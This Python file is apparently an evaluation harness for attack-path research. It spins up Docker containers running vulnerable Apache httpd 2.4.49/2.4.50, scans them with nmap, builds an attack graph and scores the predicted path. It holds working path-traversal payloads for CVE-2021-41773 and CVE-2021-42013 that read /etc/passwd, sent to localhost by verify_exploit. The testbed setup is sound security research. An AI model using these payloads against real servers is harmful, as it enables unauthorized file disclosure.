"""
Phase 3c — LIVE container/VM testbed (the centerpiece)
======================================================

The end-to-end realtime loop on a **real, running** target, not a synthetic graph:

    docker-compose vulnerable services  →  LIVE nmap -sV scan  →  3b import + version→CVE
      →  canonical AttackGraph (data-grounded EPSS/KEV)  →  NAMOA*  →  Pareto path
      →  compare the predicted path vs the GROUND-TRUTH exploitable path (recall + soundness)

Ground truth is anchored two ways, honestly:
1. **By construction** — the testbed pins service versions with known, KEV-listed CVEs and a
   known network segmentation (`evaluation/live_testbed/docker-compose.yml`), so the true
   attack path is known.
2. **By live exploitation** — each entry CVE is *actually exploited* with a safe, non-destructive
   path-traversal PoC (reads `/etc/passwd`), so the vulns are verified poppable, not merely
   version-fingerprinted. (See ``verify_exploit``.)

What is real vs supplied:
- **Real:** the running services, the nmap fingerprints, the live PoC, EPSS/KEV grounding.
- **Supplied (ground truth, not a heuristic guess):** the host-to-host topology — we *know* the
  segmentation because we built it. (Contrast 3b, where topology is an inferred heuristic.)

Run live (needs Docker + nmap):  python evaluation/live_testbed.py --up --down
Offline pipeline (no Docker):     python evaluation/live_testbed.py --offline
"""

from __future__ import annotations

import argparse
import logging
import shutil
import subprocess
import sys
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Tuple

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core.logging_system import ResearchLogger
from core.network_builder import NetworkSpec, HostSpec, VulnSpec, build_network
from core.node_types import AssetType, NodeType
from algorithms.namoa_star import run_namoa_star
from scanners.scan_import import parse_nmap, ScanFinding

logger = logging.getLogger(__name__)

COMPOSE_FILE = Path(__file__).resolve().parent / "live_testbed" / "docker-compose.yml"
SAMPLE_SCAN = Path(__file__).resolve().parent / "live_testbed" / "sample_scan.xml"


@dataclass
class TestbedService:
    """One service in the testbed: its pinned version, the known CVE for that version, and
    the safe live-exploit PoC path (path-traversal LFI of /etc/passwd)."""
    host_id: str
    port: int
    product: str
    version: str
    cve_id: str
    cvss_vector: str
    cvss_score: float
    zone: str
    internet_facing: bool = False
    is_goal: bool = False
    poc_path: str = ""


# The testbed's ground truth (matches docker-compose.yml). Real, KEV-listed CVEs; the CVSS
# vectors/scores are the published NVD values for these exact versions.
TESTBED: List[TestbedService] = [
    TestbedService(
        host_id="web", port=18080, product="Apache httpd", version="2.4.49",
        cve_id="CVE-2021-41773",
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", cvss_score=7.5,
        zone="edge", internet_facing=True,
        poc_path="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"),
    TestbedService(
        host_id="app", port=18081, product="Apache httpd", version="2.4.50",
        cve_id="CVE-2021-42013",
        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", cvss_score=9.8,
        zone="internal", is_goal=True,
        poc_path="/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"),
]
# Known segmentation (ground-truth topology) and the true entry→goal host path.
GROUND_TRUTH_TOPOLOGY: List[Tuple[str, str]] = [("web", "app")]
GROUND_TRUTH_PATH: List[str] = ["web", "app"]

# Version → CVE map keyed by (product lower, version). Honest, documented mapping from the
# fingerprinted service to its known CVE (nmap -sV reports the version, not the CVE).
_VULN_BY_VERSION: Dict[Tuple[str, str], TestbedService] = {
    (s.product.lower(), s.version): s for s in TESTBED
}
_SVC_BY_PORT: Dict[int, TestbedService] = {s.port: s for s in TESTBED}


# --- docker / nmap orchestration -------------------------------------------------

def _run(cmd: List[str], timeout: float = 180.0) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def docker_available() -> bool:
    if shutil.which("docker") is None:
        return False
    try:
        return _run(["docker", "info"], timeout=15).returncode == 0
    except Exception:
        return False


def compose_up() -> None:
    _run(["docker", "compose", "-f", str(COMPOSE_FILE), "up", "-d", "--force-recreate"])


def compose_down() -> None:
    _run(["docker", "compose", "-f", str(COMPOSE_FILE), "down"])


def run_nmap(ports: List[int], target: str = "127.0.0.1") -> str:
    """Real `nmap -sV -oX -` of the given ports. Raises if nmap is missing/fails."""
    if shutil.which("nmap") is None:
        raise RuntimeError("nmap binary not found")
    cp = _run(["nmap", "-sV", "-p", ",".join(map(str, ports)), "-oX", "-", target])
    if cp.returncode != 0:
        raise RuntimeError(f"nmap failed: {cp.stderr[:200]}")
    return cp.stdout


def verify_exploit(svc: TestbedService, timeout: float = 5.0) -> Tuple[bool, str]:
    """Run the safe, non-destructive path-traversal PoC against a service. Returns
    ``(exploited, evidence)`` — exploited iff the response leaks /etc/passwd (``root:``)."""
    url = f"http://127.0.0.1:{svc.port}{svc.poc_path}"
    try:
        # urllib doesn't re-encode an already-encoded path → preserves the %2e traversal.
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            body = resp.read(4096).decode("utf-8", "replace")
        ok = "root:x:0:0:" in body
        return ok, body.splitlines()[0] if ok else f"HTTP {resp.status}, no /etc/passwd"
    except Exception as exc:
        return False, f"{type(exc).__name__}: {exc}"


# --- scan → CVE → graph ----------------------------------------------------------

def enrich_findings(findings: List[ScanFinding]) -> List[ScanFinding]:
    """Map each fingerprinted (product, version) to its known CVE (the testbed ground-truth
    version→CVE table), attaching cve_id + CVSS vector/score. Findings whose version isn't in
    the table are left as-is (no invented CVE)."""
    for f in findings:
        key = (f.product.lower(), f.version)
        svc = _VULN_BY_VERSION.get(key)
        if svc and not f.cve_ids:
            f.cve_ids = [svc.cve_id]
            f.cvss_vector = svc.cvss_vector
            f.cvss_score = svc.cvss_score
    return findings


def build_testbed_graph(findings: List[ScanFinding], provider=None,
                        logger_: Optional[ResearchLogger] = None):
    """Build the canonical AttackGraph from the scan + the KNOWN (ground-truth) topology.

    Hosts are keyed by the published port (all share 127.0.0.1 in the testbed). EPSS/KEV are
    looked up by CVE id via ``provider`` at build time (data-grounded).
    """
    by_port: Dict[int, ScanFinding] = {}
    for f in findings:
        if f.port in _SVC_BY_PORT:
            by_port.setdefault(f.port, f)

    hosts: List[HostSpec] = []
    for svc in TESTBED:
        f = by_port.get(svc.port)
        vulns = []
        if f and f.cve_ids:
            vulns = [VulnSpec(cve_id=c, name=c, cvss_vector=f.cvss_vector,
                              cvss_score=f.cvss_score) for c in f.cve_ids]
        hosts.append(HostSpec(
            host_id=svc.host_id, name=svc.host_id, asset_type=AssetType.WEB_APPLICATION,
            network_zone=svc.zone, criticality=svc.cvss_score, ip_address="127.0.0.1",
            vulnerabilities=vulns, internet_facing=svc.internet_facing, is_goal=svc.is_goal))

    spec = NetworkSpec(name="LiveTestbed", hosts=hosts, reachability=list(GROUND_TRUTH_TOPOLOGY))
    return build_network(spec, provider=provider, logger=logger_), spec


# --- recall / soundness ----------------------------------------------------------

def _asset_path(graph, path_ids) -> List[str]:
    return [graph.get_node(n).hostname for n in path_ids
            if graph.get_node(n) and graph.get_node(n).node_type == NodeType.ASSET]


def evaluate(graph, result) -> dict:
    """Recall = is the ground-truth host path present in the Pareto front?
    Soundness = does every returned path reach a goal using only scanned hosts?"""
    scanned = {s.host_id for s in TESTBED}
    front_host_paths = [_asset_path(graph, p) for p, _ in result.pareto_paths]
    recall = 1.0 if any(hp == GROUND_TRUTH_PATH for hp in front_host_paths) else 0.0
    goal_ids = set(graph.goal_nodes)  # AttackGraph.goal_nodes is a Set[str] of node ids
    sound = 0
    for path_ids, _ in result.pareto_paths:
        reaches_goal = path_ids[-1] in goal_ids
        hosts_real = all(h in scanned for h in _asset_path(graph, path_ids))
        if reaches_goal and hosts_real:
            sound += 1
    soundness = sound / len(result.pareto_paths) if result.pareto_paths else 0.0
    return {
        "num_pareto_paths": len(result.pareto_paths),
        "ground_truth_path": GROUND_TRUTH_PATH,
        "front_host_paths": front_host_paths,
        "recall": recall,
        "soundness": soundness,
    }


# --- top-level runs --------------------------------------------------------------

def run_offline(scan_xml_path: Path = SAMPLE_SCAN, provider=None) -> dict:
    """Run the full pipeline on a captured nmap XML (no Docker, no network)."""
    qlog = ResearchLogger("live_testbed", console_output=False)
    findings = enrich_findings(parse_nmap(Path(scan_xml_path).read_text()))
    graph, spec = build_testbed_graph(findings, provider=provider, logger_=qlog)
    result = run_namoa_star(graph, logger=qlog)
    report = evaluate(graph, result)
    report["mode"] = "offline"
    report["findings"] = [(f.product, f.version, f.cve_ids) for f in findings]
    report["nodes"], report["edges"] = graph.num_nodes, graph.num_edges
    return report


def run_live(keep_up: bool = False, do_exploit: bool = True) -> dict:
    """Bring up the testbed, live-scan + (optionally) exploit it, build, search, evaluate."""
    from core.threat_data import ThreatDataProvider
    qlog = ResearchLogger("live_testbed", console_output=False)
    if not docker_available():
        raise RuntimeError("Docker daemon not available")
    compose_up()
    # wait for the entry service to answer
    import time
    for _ in range(20):
        try:
            urllib.request.urlopen(f"http://127.0.0.1:{TESTBED[0].port}/", timeout=2)
            break
        except Exception:
            time.sleep(2)
    try:
        ports = [s.port for s in TESTBED]
        xml = run_nmap(ports)
        SAMPLE_SCAN.parent.mkdir(parents=True, exist_ok=True)
        SAMPLE_SCAN.write_text(xml)  # refresh the offline fixture from the real scan
        findings = enrich_findings(parse_nmap(xml))

        exploits = {}
        if do_exploit:
            for svc in TESTBED:
                ok, evidence = verify_exploit(svc)
                exploits[svc.cve_id] = {"exploited": ok, "evidence": evidence}

        provider = ThreatDataProvider()
        graph, spec = build_testbed_graph(findings, provider=provider, logger_=qlog)
        result = run_namoa_star(graph, logger=qlog)
        report = evaluate(graph, result)
        report["mode"] = "live"
        report["fingerprints"] = [(f.product, f.version, f.port) for f in findings]
        report["cves"] = sorted({c for f in findings for c in f.cve_ids})
        report["epss"] = {c: provider.epss(c) for c in report["cves"]}
        report["kev"] = {c: provider.is_kev(c) for c in report["cves"]}
        report["exploits_verified"] = exploits
        report["nodes"], report["edges"] = graph.num_nodes, graph.num_edges
        return report
    finally:
        if not keep_up:
            compose_down()


if __name__ == "__main__":
    import json
    ap = argparse.ArgumentParser(description="CTPPO Phase 3c live testbed")
    ap.add_argument("--offline", action="store_true", help="run on the captured scan, no Docker")
    ap.add_argument("--keep-up", action="store_true", help="leave containers running")
    ap.add_argument("--no-exploit", action="store_true", help="skip the live PoC")
    args = ap.parse_args()
    rep = run_offline() if args.offline else run_live(
        keep_up=args.keep_up, do_exploit=not args.no_exploit)
    print(json.dumps(rep, indent=2, default=str))
